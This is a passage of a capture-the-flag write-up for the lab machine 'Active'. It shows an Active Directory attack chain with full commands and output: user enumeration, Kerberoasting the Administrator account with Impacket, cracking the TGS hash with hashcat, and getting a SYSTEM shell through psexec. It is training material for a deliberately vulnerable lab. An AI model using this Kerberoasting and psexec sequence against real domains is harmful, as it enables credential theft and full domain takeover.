  Searches                            D        0  Sat Jul 21 17:16:24 2018

                5217023 blocks of size 4096. 277722 blocks available
```

`mkdir ./svc_tgs`

`smbclient -U 'svc_tgs%GPPstillStandingStrong2k18' //10.10.10.100/Users -c 'prompt OFF;recurse ON;cd SVC_TGS;lcd /home/kali/svc_tgs;mget *'`:
```
getting file \SVC_TGS\Desktop\user.txt of size 34 as Desktop/user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

The user flag can be retrieved by connecting to the `Users` share, and navigating to `SVC_TGS`'s `Desktop`.

`tree ./svc_tgs`:
```
./svc_tgs
├── Contacts
├── Desktop
│   └── user.txt 🔍
├── Downloads
├── Favorites
├── Links
├── My Documents
├── My Music
├── My Pictures
├── My Videos
├── Saved Games
└── Searches

12 directories, 1 file
```

`cat ./svc_tgs/Desktop/user.txt`:
```
614ee*************************** 🚩
```

`ldapsearch` can now be used to query the Domain Controller for Active Directory `UserAccountControl` attributes of active accounts, and for other specific configurations that might be applied to them. A number of `UserAccountControl` attributes also have security relevance. The Microsoft page below lists the possible `UserAccountControl` values.

`ldapsearch -x -H 'ldap://10.10.10.100' -D 'svc_tgs' -w 'GPPstillStandingStrong2k18' -b 'dc=active,dc=htb' -s sub '(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))' samaccountname | grep sAMAccountName`:
```
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

- `-s sub`: The `-s` option specifies the search scope. `sub` means a subtree search, including the base DN and all its child entries. This is the most comprehensive search scope, as it traverses the entire directory tree below the base DN.
- `(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))` is an LDAP search filter to find all user objects that are not disabled. Here's the breakdown:
	- `objectCategory=person`: Searches for objects in the category "person".
	- `objectClass=user`: Narrows down to objects with a class of "user".
	- `!(useraccountcontrol:1.2.840.113556.1.4.803:=2)` : Excludes disabled accounts.
	- The `userAccountControl` attribute is a bit flag; this part of the filter excludes accounts with the second bit set (which indicates a disabled account).

We see that other than our compromised account, the `Administrator` account is active.

<🔄 Alternative Step>

`netexec smb 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --users`:
```
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.10.100    445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain 
SMB         10.10.10.100    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.10.100    445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account 
SMB         10.10.10.100    445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
SMB         10.10.10.100    445    DC               [*] Enumerated 4 local users: ACTIVE
```

`netexec smb 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --users | awk '{ print $5 }' | grep -v -E ']|-' | awk '{ print tolower($0) }' | tee ./domain_users.txt`:
```
administrator
guest
krbtgt
svc_tgs
```

`kerbrute userenum --dc 10.10.10.100 -d 'active.htb' ./domain_users.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/20/24 - Ronnie Flathers @ropnop

2024/11/20 15:15:58 >  Using KDC(s):
2024/11/20 15:15:58 >   10.10.10.100:88

2024/11/20 15:15:58 >  [+] VALID USERNAME:       svc_tgs@active.htb
2024/11/20 15:15:58 >  [+] VALID USERNAME:       administrator@active.htb
2024/11/20 15:15:58 >  Done! Tested 4 usernames (2 valid) in 0.134 seconds
```

<🔄 Alternative Step>

Also `Impacket`’s `GetADUsers.py` simplifies the process of enumerating domain user accounts.

`impacket-GetADUsers -dc-ip 10.10.10.100 'active.htb/svc_tgs:GPPstillStandingStrong2k18' -all`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 21:06:40.351723  2024-11-20 03:06:34.705369 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 20:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 22:14:38.402764  2024-11-20 13:49:20.266306
```

Another common technique of gaining privileges within an Active Directory Domain is "Kerberoasting", which is an offensive technique created by Tim Medin and revealed at DerbyCon 2014.
Kerberoasting involves extracting a hash of the encrypted material from a Kerberos Ticket Granting Service ticket reply (`TGS_REP`), which can be subjected to offline cracking in order to retrieve the plaintext password.
This is possible because the `TGS_REP` is encrypted using the `NTLM` password hash of the account in whose context the service instance is running.

Managed service accounts mitigate this risk, due to the complexity of their passwords, but they are not in active use in many environments. It is worth noting that shutting down the server hosting the service doesn’t mitigate, as the attack doesn’t involve communication with the target service. It is therefore important to regularly audit the purpose and privilege of all enabled accounts.

Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service instance.
`ldapsearch` can be used to identify accounts that are configured with SPNs.

`ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b 'dc=active,dc=htb' -s sub '(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))' serviceprincipalname | grep 'servicePrincipalName' -B1`:
```
servicePrincipalName: active/CIFS:445
```

It seems that the `active\Administrator` account has been configured with an SPN.

`Impacket`’s `GetUserSPNs.py` lets us request the TGS and extract the hash for offline cracking.

`impacket-GetUserSPNs -dc-ip 10.10.10.100 'active.htb/svc_tgs:GPPstillStandingStrong2k18' -usersfile ./domain_users.txt`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
$krb5tgs$23$*administrator$ACTIVE.HTB$administrator*$27e5ceac8cdc6c90d50607beb770069d$4d5da6d556642dc6d2f8664d745ef4a1823bf6815d8cddd9d1281769d6c7fb8cba3c5f5ffc41a72285e58047067405fe667980841144edca3ef4a9f296bd117736da4ef4ac7e9f0bac9af8e8eb30e0c34f15519855657579642a08c6eec39262052f993e50acf3fda80b0f762c51eff183e7298a668c6695759b6502f3b8f433453179239d22c18ca28fad50cdedc55f1087975a32230bbe3924eab9454b1e01836a24fec4fa26e8334ad8589e55fe5af9bd44ae86a5badcf3005f0300bc905ea30c9f32543cb1cd390d9856f9981fe996322ccdf6f2a4f9f6b2247b90f444a74afb4dbca096853b49bf1d459087ca7beb253bedd737e318237ce9fcf41add8f8ae2febbfe9be3a6bdb9fd271c98a74d51b3105d51931cfcdf13de0984c0da63e13ad25ce5db8d99af76d86127928760749a83f0b88bb9832939d0f8c0ca4345bd0556be884a71fda979830c48c7f469f930d638922cc95156f787113617cfa54db08f21cbc5bd178b236e83784c6c8458d6ee1cc8f8682c2f921d170e6e4d80458627c34e90486c8ecad48be87bc83c6974451ba30f7093f233b7ddbd8b9ab4352ba4a4f7c567e85e1c324b9434f30c464541493313270b312416d1f5ea4cb38c0ed69361a123090473ae3691053962c67aab105e55338607c3a6572ec9dafd2b262f2ea60a7d6055fff2942e4d3194b88ad6cdcf87e66f3e3e6421c878a586b88a168c3bd39bbb7b04bfcd1b1310a229ab71292c225f8d4c1a1609cff835c0042056ba33187ae07a5e049db4e9dc92f3fc479fd0e77f3b1b0588f2a1a332649507e7cb851e176b17fdd274f5f26db903ef363632237abc3155f6ec742da08d60626c55cc9481946ae8765678a7fd2034833357e09980c4bcd5a4a7501e58082ca832e2784b7fcd0a89774f61106b97765d1ac296d7875188399716ecda910cd7376471c1291e08dc29b5199105953f88d1ea28c281653fd487a30bcd3dd5945556f76c8b0bdd81c0702eccde0ab453d87d83706eb07e00aaa7d697a549b3b630eb261899ba2a73d2d6aca77dbb6cde6c3f333e94905b7c61b5b4d4f7b82729e779e93addf355212722379c7d2f6f8113f4455fa24459ea2d097564c634a43e41fd2bad9dea8e5b5425129eb5537ebdc23098db153a9f7d75da768fa36dba9b2a7553aa95a63f47a7127f7be8126a0f8fce9473136180ccbe3a50084bd14f5bdda445ecf841de1efc644dd3e876375a3546791d64f8c48fa601 📌
[-] Principal: guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*krbtgt$ACTIVE.HTB$krbtgt*$9514b155d784851b9d21cce943a10d49$6d6794c30e3a71f8457af95297eb88cdba4ac0b4dcbbb8846271434013c72ad902b5180011b9f873fcd5c93e65a40ee476d7ab8e7932e640406da566e0e78cb8c853e81970121ed4285dbdd1b2ec3d84d002413f0d83a694d28597122ac372fa6566a3f98afbd07da94311cf59b20d9d93dff77ac7d64390bc1b09d47960ca6d8a3adb2c56d11b3709715f7e341a5fbc798c288275ec3ceecaf11a1a70b224626f7ec3bc6bc61cfc72b9eba133e7d2caab17d711e03a30961656dfabb185afea2bd0e95c84024aa2e3157d7ecc8a92aa94b49c88279bbe1ce581af5cd1f5b36ebb7406b566f4a0cbd6e4256e08d0fa73c9de5b58ee5a8f1a0fe602785080fe7665fd6c37c1dcb5e8e0117cbec330ae60db18b5447993766c8f42d780b1de9798c56f2927daa4aca38fba32034f4017c46e7ac31393c07948e89acfc2cacefc0ad2089e7f171dfb6d710424c748e50a7611fbb75378cc3b375b40d1ffced0566853b23fa69f8a745e7967a83efd8e9eb027f24597775a2ff2a1843c7979f69e4cf9a9bacb6cdfcc6582302b6799afffcdae37033ccfe1b30b047c5c3b1cc3b0d0707ae955a9b16851201e6ba6d8d368bf95cd0fddcc9e9692069a64b881915904c9ab30d2d8c5235f542307ce36e0e07384ddbe67cae6e26116255f5720be53882efdb650a33f4e58bd2bc6ea527a806e8c5ebd9f27f2f8ccf4ba287deb6773cf9efeadebcb1244a8d5eb62423e36752e22ac65bdc9403a283977d599185901647a15e43518cfa03c5d9188ff5d3020903a7043fa4784819cd042ad5d82b4fb8bed8b1f7c5f69b7771962930ca492841ca1faac85c7790d15b9daf95f4cbf283fac8ef84a8041248cd173956bbec015e4d6c6034ea17d385067f26fccfc1602650f4835de9b1a939f499f85eb8e710bf9654a019c98f037427b8a90d9ab41b849cb1f636fab330d4611ffe154d095824f9dcec39bf9abaa820502c1066f65011a302021f91c8eccdf7e1819d337470f3b3f21c6480a734afcb23b782a7c384bfc1f9548c273c86cccd432bc22f30ecf9184e4b78b8c21e2ba5a35dec97811ce270eb151113a7ce07f26ff492d23716b550b83a070c462952e316a551f7e407897b49b30574411011bd68d73feaf370eda1d8155cc87bd043dc84b1d2c45a7df7b182b30e04517088d89dbc9453190ab8f498af73fe0804fcf6b325f62510973c2d19fe83bb6fa0ebae1ec599d426539e59a7e8741c2170abb76d0
[-] Principal: svc_tgs - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

`vim ./krbtgs_hash.txt`:
```
$krb5tgs$23$*administrator$ACTIVE.HTB$administrator*$27e5ceac8cdc6c90d50607beb770069d$4d5da6d556642dc6d2f8664d745ef4a1823bf6815d8cddd9d1281769d6c7fb8cba3c5f5ffc41a72285e58047067405fe667980841144edca3ef4a9f296bd117736da4ef4ac7e9f0bac9af8e8eb30e0c34f15519855657579642a08c6eec39262052f993e50acf3fda80b0f762c51eff183e7298a668c6695759b6502f3b8f433453179239d22c18ca28fad50cdedc55f1087975a32230bbe3924eab9454b1e01836a24fec4fa26e8334ad8589e55fe5af9bd44ae86a5badcf3005f0300bc905ea30c9f32543cb1cd390d9856f9981fe996322ccdf6f2a4f9f6b2247b90f444a74afb4dbca096853b49bf1d459087ca7beb253bedd737e318237ce9fcf41add8f8ae2febbfe9be3a6bdb9fd271c98a74d51b3105d51931cfcdf13de0984c0da63e13ad25ce5db8d99af76d86127928760749a83f0b88bb9832939d0f8c0ca4345bd0556be884a71fda979830c48c7f469f930d638922cc95156f787113617cfa54db08f21cbc5bd178b236e83784c6c8458d6ee1cc8f8682c2f921d170e6e4d80458627c34e90486c8ecad48be87bc83c6974451ba30f7093f233b7ddbd8b9ab4352ba4a4f7c567e85e1c324b9434f30c464541493313270b312416d1f5ea4cb38c0ed69361a123090473ae3691053962c67aab105e55338607c3a6572ec9dafd2b262f2ea60a7d6055fff2942e4d3194b88ad6cdcf87e66f3e3e6421c878a586b88a168c3bd39bbb7b04bfcd1b1310a229ab71292c225f8d4c1a1609cff835c0042056ba33187ae07a5e049db4e9dc92f3fc479fd0e77f3b1b0588f2a1a332649507e7cb851e176b17fdd274f5f26db903ef363632237abc3155f6ec742da08d60626c55cc9481946ae8765678a7fd2034833357e09980c4bcd5a4a7501e58082ca832e2784b7fcd0a89774f61106b97765d1ac296d7875188399716ecda910cd7376471c1291e08dc29b5199105953f88d1ea28c281653fd487a30bcd3dd5945556f76c8b0bdd81c0702eccde0ab453d87d83706eb07e00aaa7d697a549b3b630eb261899ba2a73d2d6aca77dbb6cde6c3f333e94905b7c61b5b4d4f7b82729e779e93addf355212722379c7d2f6f8113f4455fa24459ea2d097564c634a43e41fd2bad9dea8e5b5425129eb5537ebdc23098db153a9f7d75da768fa36dba9b2a7553aa95a63f47a7127f7be8126a0f8fce9473136180ccbe3a50084bd14f5bdda445ecf841de1efc644dd3e876375a3546791d64f8c48fa601
```

`hashcat --example-hashes | grep -i -F '$krb5tgs$23$' -B12`:
```
Hash mode #13100
  Name................: Kerberos 5, etype 23, TGS-REP
  Category............: Network Protocol
  Slow.Hash...........: No
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure, optimized
  Example.Hash.Format.: plain
  Example.Hash........: $krb5tgs$23$*user$realm$test/spn*$b548e10f5694a...24d9a [Truncated, use --mach for full length]
```

We use `hashcat` with the `rockyou.txt` wordlist to crack the hash and obtain the `active\administrator` password of `Ticketmaster1968`.

`hashcat -m 13100 ./krbtgs_hash.txt /usr/share/wordlists/rockyou.txt`:
```
hashcat (v6.2.6) starting

[...]

$krb5tgs$23$*administrator$ACTIVE.HTB$administrator*$27e5ceac8cdc6c90d50607beb770069d$4d5da6d556642dc6d2f8664d745ef4a1823bf6815d8cddd9d1281769d6c7fb8cba3c5f5ffc41a72285e58047067405fe667980841144edca3ef4a9f296bd117736da4ef4ac7e9f0bac9af8e8eb30e0c34f15519855657579642a08c6eec39262052f993e50acf3fda80b0f762c51eff183e7298a668c6695759b6502f3b8f433453179239d22c18ca28fad50cdedc55f1087975a32230bbe3924eab9454b1e01836a24fec4fa26e8334ad8589e55fe5af9bd44ae86a5badcf3005f0300bc905ea30c9f32543cb1cd390d9856f9981fe996322ccdf6f2a4f9f6b2247b90f444a74afb4dbca096853b49bf1d459087ca7beb253bedd737e318237ce9fcf41add8f8ae2febbfe9be3a6bdb9fd271c98a74d51b3105d51931cfcdf13de0984c0da63e13ad25ce5db8d99af76d86127928760749a83f0b88bb9832939d0f8c0ca4345bd0556be884a71fda979830c48c7f469f930d638922cc95156f787113617cfa54db08f21cbc5bd178b236e83784c6c8458d6ee1cc8f8682c2f921d170e6e4d80458627c34e90486c8ecad48be87bc83c6974451ba30f7093f233b7ddbd8b9ab4352ba4a4f7c567e85e1c324b9434f30c464541493313270b312416d1f5ea4cb38c0ed69361a123090473ae3691053962c67aab105e55338607c3a6572ec9dafd2b262f2ea60a7d6055fff2942e4d3194b88ad6cdcf87e66f3e3e6421c878a586b88a168c3bd39bbb7b04bfcd1b1310a229ab71292c225f8d4c1a1609cff835c0042056ba33187ae07a5e049db4e9dc92f3fc479fd0e77f3b1b0588f2a1a332649507e7cb851e176b17fdd274f5f26db903ef363632237abc3155f6ec742da08d60626c55cc9481946ae8765678a7fd2034833357e09980c4bcd5a4a7501e58082ca832e2784b7fcd0a89774f61106b97765d1ac296d7875188399716ecda910cd7376471c1291e08dc29b5199105953f88d1ea28c281653fd487a30bcd3dd5945556f76c8b0bdd81c0702eccde0ab453d87d83706eb07e00aaa7d697a549b3b630eb261899ba2a73d2d6aca77dbb6cde6c3f333e94905b7c61b5b4d4f7b82729e779e93addf355212722379c7d2f6f8113f4455fa24459ea2d097564c634a43e41fd2bad9dea8e5b5425129eb5537ebdc23098db153a9f7d75da768fa36dba9b2a7553aa95a63f47a7127f7be8126a0f8fce9473136180ccbe3a50084bd14f5bdda445ecf841de1efc644dd3e876375a3546791d64f8c48fa601:Ticketmaster1968 🔑

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*administrator$ACTIVE.HTB$administrator...8fa601
Time.Started.....: Wed Nov 20 14:39:40 2024 (34 secs)
Time.Estimated...: Wed Nov 20 14:40:14 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   303.6 kH/s (1.35ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10537984/14344385 (73.46%)
Rejected.........: 0/10537984 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany95 -> ThruJasonK21
Hardware.Mon.#1..: Util: 33%

Started: Wed Nov 20 14:39:13 2024
Stopped: Wed Nov 20 14:40:16 2024
```

`netexec smb 10.10.10.100 -u 'administrator' -p 'Ticketmaster1968'`:
```
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
```

`Impacket`’s `psexec.py` can be used to get a shell as `active\administrator`, and read `root.txt`.

`impacket-psexec 'active.htb/administrator:Ticketmaster1968@10.10.10.100'`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file cjtGLGTx.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service ebcY on 10.10.10.100.....
[*] Starting service ebcY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system
```

`cd C:\\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 15BB-D59C

 Directory of C:\Users\Administrator\Desktop

21/01/2021  06:49 AM    <DIR>          .
21/01/2021  06:49 AM    <DIR>          ..
20/11/2024  04:06 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   1.135.853.568 bytes free
```

`type root.txt`:
```
3ba39*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
